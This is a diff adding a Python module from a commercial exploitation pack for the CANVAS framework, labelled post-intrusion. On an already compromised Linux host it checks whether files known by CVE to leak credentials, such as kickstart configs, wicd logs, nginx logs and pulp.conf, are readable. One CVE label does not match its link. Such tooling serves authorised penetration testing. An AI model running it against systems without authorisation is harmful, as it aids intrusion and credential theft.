@@ -1,0 +1,79 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2012
+#
+
+import sys, os, socket, string, getopt, struct
+
+sys.path.append(".")
+
+from canvasexploit import canvasexploit
+from exploitutils import *
+import libs.canvasos as canvasos
+import canvasengine
+
+NAME = "d2sec_passdisclo"
+VERSION = "0.2"
+DESCRIPTION = "Check local files with sensitive informations"
+
+DOCUMENTATION = {}
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Post-Intrusion"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+class theexploit(canvasexploit):
+
+  def __init__(self):
+    canvasexploit.__init__(self)
+    self.supportedNodeArgs = ["linuxNode"]
+    self.name = NAME
+    self.node = ''
+    self.vulns = { 
+      '/var/log/wicd/wicd.log': ['F', 'CVE-2012-0813', 'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-0813'],
+      '/root/anaconda-ks.cfg': ['F', 'CVE-2012-0813', 'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-2664'],
+      '/var/log/rhncfg-actions': ['F', 'CVE-2012-2679', 'http://www.osvdb.org/show/osvdb/86396'],
+      '/etc/pulp/pulp.conf': ['F', 'CVE-2012-4574', 'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-4574'],
+      '/var/log/nginx/access.log': ['F', 'CVE-2013-0337', 'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-0337'],
+      '/var/log/nginx/error.log': ['F', 'CVE-2013-0337', 'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-0337'],
+      '/var/cache/jboss-ec2-eap/': ['R', 'CVE-2012-3427', 'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-3427'],
+    }
+
+  def check_local_files(self):
+    self.log('[D2] Checking local files with sensitive informations')
+    i = 0
+    for file, refs in self.vulns.items():
+      if refs[0] == 'F':
+        f = self.node.shell.open(file, self.node.shell.libc.getdefine('O_RDONLY'))
+        if f > -1:
+          i +=1
+          self.log('[D2] %-32s | %s | %s' % (file, refs[1], refs[2]))
+      else:
+        data = self.node.runcommand('/bin/ls -alp %s'%file)
+        if data.count('Error') > 0:
+          continue
+        else:
+          i += 1
+          self.log('[D2] %-32s | %s | %s' % (file, refs[1], refs[2]))
+    if i == 0:
+      self.log('[D2] File not found') 
+
+  def run(self):
+    self.setInfo('[D2] %s v. %s (in progress)'%(NAME, VERSION))
+    for node in self.argsDict["passednodes"]:
+      type = node.nodetype
+      if type in self.supportedNodeArgs[0]:
+        self.node = node
+        self.check_local_files()
+        self.setInfo('[D2] %s v. %s - done (success)'%(NAME, VERSION))
+        return 1
+    self.log('[D2] %s node type not supported'%type)
+    self.setInfo('[D2] %s v. %s - done (failed)'%(NAME, VERSION))
+    return 0
+	
+if __name__ == "__main__":
+  print "This module is meant to be run only within CANVAS"
